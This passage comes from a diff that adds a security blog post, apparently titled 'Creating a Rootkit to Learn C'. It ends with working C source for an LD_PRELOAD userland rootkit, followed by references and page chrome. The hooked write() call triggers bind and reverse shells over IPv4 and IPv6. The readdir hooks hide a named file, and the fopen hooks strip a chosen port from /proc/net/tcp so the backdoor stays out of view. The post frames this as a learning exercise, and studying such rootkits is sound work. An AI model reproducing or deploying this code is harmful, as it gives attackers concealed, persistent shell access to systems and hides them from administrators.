+    <span class="k">if</span> <span class="p">(</span><span class="n">bind4</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv4_bind</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">bind6</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv6_bind</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rev4</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv4_rev</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rev6</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv6_rev</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">old_readdir</span><span class="p">)(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span><span class="p">);</span>
+<span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="nf">readdir</span><span class="p">(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">old_readdir</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"readdir"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">dir</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">dir</span> <span class="o">=</span> <span class="n">old_readdir</span><span class="p">(</span><span class="n">dirp</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">dir</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span><span class="n">FILENAME</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">dir</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">old_readdir64</span><span class="p">)(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span><span class="p">);</span>
+<span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="nf">readdir64</span><span class="p">(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">old_readdir64</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"readdir64"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="n">dir</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">dir</span> <span class="o">=</span> <span class="n">old_readdir64</span><span class="p">(</span><span class="n">dirp</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">dir</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span><span class="n">FILENAME</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">dir</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">FILE</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_fopen64</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">);</span>
+<span class="kt">FILE</span> <span class="o">*</span><span class="nf">fopen64</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">orig_fopen64</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"fopen64"</span><span class="p">);</span>
+
+	<span class="kt">char</span> <span class="o">*</span><span class="n">ptr_tcp</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">"/proc/net/tcp"</span><span class="p">);</span>
+
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">ptr_tcp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+		<span class="kt">FILE</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="n">tmpfile64</span><span class="p">();</span>
+		<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen64</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+		<span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="kt">char</span> <span class="o">*</span><span class="n">listener</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">KEY_PORT</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">listener</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="k">continue</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">else</span>
+			<span class="p">{</span>
+				<span class="n">fputs</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="n">temp</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen64</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">FILE</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_fopen</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">);</span>
+<span class="kt">FILE</span> <span class="o">*</span><span class="nf">fopen</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">orig_fopen</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"fopen"</span><span class="p">);</span>
+
+	<span class="kt">char</span> <span class="o">*</span><span class="n">ptr_tcp</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">"/proc/net/tcp"</span><span class="p">);</span>
+
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">ptr_tcp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+		<span class="kt">FILE</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="n">tmpfile</span><span class="p">();</span>
+		<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+		<span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="kt">char</span> <span class="o">*</span><span class="n">listener</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">KEY_PORT</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">listener</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="k">continue</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">else</span>
+			<span class="p">{</span>
+				<span class="n">fputs</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="n">temp</span><span class="p">;</span>
+
+	<span class="p">}</span>
+
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="references">References</h2>
+<p>I apologize if I left anyone off, writing this thing was a blur, I had so many tabs open that they barely could fit favicons on them.</p>
+
+<ul>
+  <li><a href="https://gist.github.com/amitsaha/8169242">/bin/ls explanation</a></li>
+  <li><a href="https://danielmiessler.com/study/lsof/">lsof guide</a></li>
+  <li><a href="https://idea.popcount.org/2014-04-03-bind-before-connect/">ephermeral port allocation</a></li>
+  <li><a href="http://www.infosecisland.com/blogview/22440-Analyzing-Jynx-and-LDPRELOAD-Based-Rootkits.html">Jynx explainer</a></li>
+  <li><a href="https://ketansingh.net/overview-on-linux-userland-rootkits/">userland LD_PRELOAD rootkits</a></li>
+  <li><a href="https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/">hooking shared library functions</a></li>
+  <li><a href="http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html">socket programming in C</a></li>
+  <li><a href="http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html">@epi052 socket programming recommendation</a></li>
+  <li><a href="https://github.com/chokepoint/Jynx2/blob/master/jynx2.c">Jynx2 source code</a></li>
+  <li><a href="https://deceiveyour.team/2018/08/26/tcp-ipv4-and-ipv6-reverse-shell/">ipv6 socket programming</a></li>
+  <li><a href="https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/">iamrastating socket programming</a></li>
+  <li><a href="https://volatility-labs.blogspot.com/2012/09/movp-24-analyzing-jynx-rootkit-and.html">detecting and analyzing LD_PRELOAD rootkits</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#jynx-rootkit" class="page__taxonomy-item" rel="tag">Jynx Rootkit</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ld-preload" class="page__taxonomy-item" rel="tag">LD_PRELOAD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rootkits" class="page__taxonomy-item" rel="tag">Rootkits</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#socket-programming" class="page__taxonomy-item" rel="tag">Socket Programming</a>
+    
+    </span>
+  </p>
+
+
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-09-29T00:00:00-04:00">September 29, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Creating+a+Rootkit+to+Learn+C%20https%3A%2F%2Fh0mbre.github.io%2FLearn-C-By-Creating-A-Rootkit%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fh0mbre.github.io%2FLearn-C-By-Creating-A-Rootkit%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fh0mbre.github.io%2FLearn-C-By-Creating-A-Rootkit%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fh0mbre.github.io%2FLearn-C-By-Creating-A-Rootkit%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/Security-Certifications-And-Fun/" class="pagination--pager" title="Eight Certs in 18 Months, Lessons Learned
+">Previous</a>
+    
+    
+      <a href="/Babys-First-Shellcode/" class="pagination--pager" title="Baby’s First Win32 Shellcode
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/avatar.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Fuzzing-Like-A-Caveman-5/" rel="permalink">Fuzzing Like A Caveman 5: A Code Coverage Tour for Cavepeople
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  19 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+We’ve already discussed the importance of code coverage previously in this series so today we’ll try to understand some of the very basic under...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/avatar.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/RyzenMaster_CVE/" rel="permalink">CVE-2020-12928 Exploit Proof-of-Concept, Privilege Escalation in AMD Ryzen Master AMDRyzenMasterDriver.sys
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  13 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Background
+Earlier this year I was really focused on Windows exploit development and was working through the FuzzySecurity exploit development tutorials on t...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/avatar.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Fuzzing-Like-A-Caveman-4/" rel="permalink">Fuzzing Like A Caveman 4: Snapshot/Code Coverage Fuzzer!
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  17 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+Last time we blogged, we had a dumb fuzzer that would test an intentionally vulnerable program that would perform some checks on a file and if t...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/avatar.jpg"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Fuzzing-Like-A-Caveman-3/" rel="permalink">Fuzzing Like A Caveman 3: Trying to Somewhat Understand The Importance Code Coverage
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  17 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+In this episode of ‘Fuzzing like a Caveman’, we’ll be continuing on our by noob for noobs fuzzing journey and trying to wrap our little baby fuz...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 The Human Machine Interface. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
